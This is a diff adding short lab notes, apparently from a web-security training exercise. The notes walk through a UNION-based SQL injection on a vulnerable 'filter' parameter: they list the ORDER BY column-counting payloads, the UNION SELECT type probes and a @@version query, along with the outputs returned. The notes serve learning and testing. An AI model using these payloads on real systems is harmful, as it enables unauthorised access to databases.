@@ -1,0 +1,18 @@
+Do a SQLi on the Microsoft , MySQL DB
+
+filter parameter is vulnerable
+
+Objective: Display the version of the DB
+
+[!] The payload only works with the Burpsuite repeater
+
+STEP 1: Determining the number of columns:
+ payload: ' order by 1#, ' order by 2# , ...
+ Output: There is 2 columns
+
+ STEP 2: Determining the data type:
+ payload: 'UNION SELECT 'a', NULL # ; 'UNION SELECT 'a', 'a' #
+
+ STEP 3 : Display the version
+ payload: 'UNION SELECT @@version, NULL #
+ Output: 8.0.31-0ubuntu0.20.04.1
